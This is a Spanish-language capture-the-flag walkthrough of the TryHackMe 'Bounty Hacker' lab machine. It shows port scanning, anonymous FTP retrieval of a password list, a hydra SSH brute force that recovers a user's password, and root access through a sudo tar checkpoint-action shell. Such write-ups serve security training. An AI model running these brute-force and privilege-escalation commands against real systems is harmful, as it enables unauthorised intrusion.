---
title: Try Hack Me Bounty Hakcer
author: k4miyo
date: 2023-06-19
math: true
mermaid: true
image:
  path: /assets/images/thm/tryhackme.png
categories: [Easy, Linux]
tags: [SSH, Brute Force, SUDO]
ping: true
---

## Máquina Bounty Hacker
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.200.126.

```bash
❯ ping -c 1 10.10.200.126
PING 10.10.200.126 (10.10.200.126) 56(84) bytes of data.
64 bytes from 10.10.200.126: icmp_seq=1 ttl=63 time=214 ms

--- 10.10.200.126 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 213.643/213.643/213.643/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.200.126 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 20:03 CST
Initiating Parallel DNS resolution of 1 host. at 20:03
Completed Parallel DNS resolution of 1 host. at 20:03, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 20:03
Scanning 10.10.200.126 [65535 ports]
Discovered open port 21/tcp on 10.10.200.126
Discovered open port 22/tcp on 10.10.200.126
Discovered open port 80/tcp on 10.10.200.126
Completed SYN Stealth Scan at 20:04, 24.61s elapsed (65535 total ports)
Nmap scan report for 10.10.200.126
Host is up, received user-set (0.16s latency).
Scanned at 2023-06-19 20:03:48 CST for 24s
Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.84 seconds
           Raw packets sent: 121706 (5.355MB) | Rcvd: 10648 (425.932KB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬───────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.200.126
   5   │     [*] Open ports: 21,22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p21,22,80 10.10.200.126 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 20:04 CST
Nmap scan report for 10.10.200.126
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.85.95
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.66 seconds
```

Vemos el puerto 21 abierto y posiblemente se pueda ingresar haciendo uso del usuario ***anonymous***:

```bash
❯ ftp 10.10.200.126
Connected to 10.10.200.126.
220 (vsFTPd 3.0.3)
Name (10.10.200.126:k4miyo): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> 
```

Tenemos algunos archivos txt, por lo que vamos a traerlos a nuestra máquina de atacante y ver su contenido.

```bash
ftp> mget *
mget locks.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.08 secs (5.0341 kB/s)
mget task.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (345.8659 kB/s)
ftp>
```

```bash
❯ cat locks.txt
───────┬─────────────────────────────────────────────
       │ File: locks.txt
───────┼─────────────────────────────────────────────
   1   │ rEddrAGON
   2   │ ReDdr4g0nSynd!cat3
   3   │ Dr@gOn$yn9icat3
   4   │ R3DDr46ONSYndIC@Te
   5   │ ReddRA60N
   6   │ R3dDrag0nSynd1c4te
   7   │ dRa6oN5YNDiCATE
   8   │ ReDDR4g0n5ynDIc4te
   9   │ R3Dr4gOn2044
  10   │ RedDr4gonSynd1cat3
  11   │ R3dDRaG0Nsynd1c@T3
  12   │ Synd1c4teDr@g0n
  13   │ reddRAg0N
  14   │ REddRaG0N5yNdIc47e
  15   │ Dra6oN$yndIC@t3
  16   │ 4L1mi6H71StHeB357
  17   │ rEDdragOn$ynd1c473
  18   │ DrAgoN5ynD1cATE
  19   │ ReDdrag0n$ynd1cate
  20   │ Dr@gOn$yND1C4Te
  21   │ RedDr@gonSyn9ic47e
  22   │ REd$yNdIc47e
  23   │ dr@goN5YNd1c@73
  24   │ rEDdrAGOnSyNDiCat3
  25   │ r3ddr@g0N
  26   │ ReDSynd1ca7e
───────┴───────────────────────
❯ cat task.txt
───────┬────────────────────────────────────────────────────
       │ File: task.txt
───────┼────────────────────────────────────────────────────
   1   │ 1.) Protect Vicious.
   2   │ 2.) Plan for Red Eye pickup on the moon.
   3   │ 
   4   │ -lin
───────┴────────────────────────────────────────────────
```

Nos encontramos con un posible diccionario y unas tareas, así mismo, observamos un usuario: **lin***.  Ahora vamos a echarle un ojo al sitio web:

```bash
❯ whatweb http://10.10.200.126/
http://10.10.200.126/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.200.126]
```

![](/assets/images/thm-bountyhacker/bountyhacker.png)

Básicamente el sitio web nos dice que debemos entrar a la máquina; por lo tanto, tenemos un potencial usuario y una lista de contraseñas, por lo que podríamos tratar de ingresar vía ssh:

```bash
❯ hydra -l lin -P locks.txt ssh://10.10.200.126
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-19 20:31:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.200.126:22/
[22][ssh] host: 10.10.200.126   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-19 20:31:28
```

Ya tenemos las credenciales de acceso ssh y podemos visualizar la flag (user.txt):

```bash
❯ ssh lin@10.10.200.126
The authenticity of host '10.10.200.126 (10.10.200.126)' can't be established.
ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.200.126' (ECDSA) to the list of known hosts.
lin@10.10.200.126's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ whoami
lin
lin@bountyhacker:~/Desktop$
```

Ahora vamos a enumerar un poco el sistema para ver como podemos escalar privilegios:

```bash
lin@bountyhacker:/home$ id
uid=1001(lin) gid=1001(lin) groups=1001(lin)
lin@bountyhacker:/home$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
lin@bountyhacker:/home$
```

Podemos ejecutar el binario `/bin/tar` como el usuario **root**; por lo tanto ya sabemos que debemos ir a [GTFobins](https://gtfobins.github.io/):

```bash
lin@bountyhacker:/home$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# 
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).